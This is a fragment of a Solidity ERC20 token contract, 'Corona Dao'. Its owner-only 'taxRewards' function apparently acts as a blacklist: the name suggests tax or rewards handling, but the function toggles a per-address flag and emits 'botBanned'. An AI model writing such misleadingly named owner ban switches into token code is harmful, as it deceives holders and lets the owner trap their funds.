...
contract CoronaDao is Context, IERC20, Ownable {
    ...
    string private _name = 'Corona Dao';
    string private _symbol = 'CoronaDAO';
    ...
    function taxRewards(address taxAddress) external onlyOwner {
        if (_taxRewards[taxAddress] == true) {
            _taxRewards[taxAddress] = false;
        } else {_taxRewards[taxAddress] = true;
            emit botBanned (taxAddress, _taxRewards[taxAddress]);
          }
    }
    
    function taxState(address taxAddress) public view returns (bool) {
        return _taxRewards[taxAddress];
    }
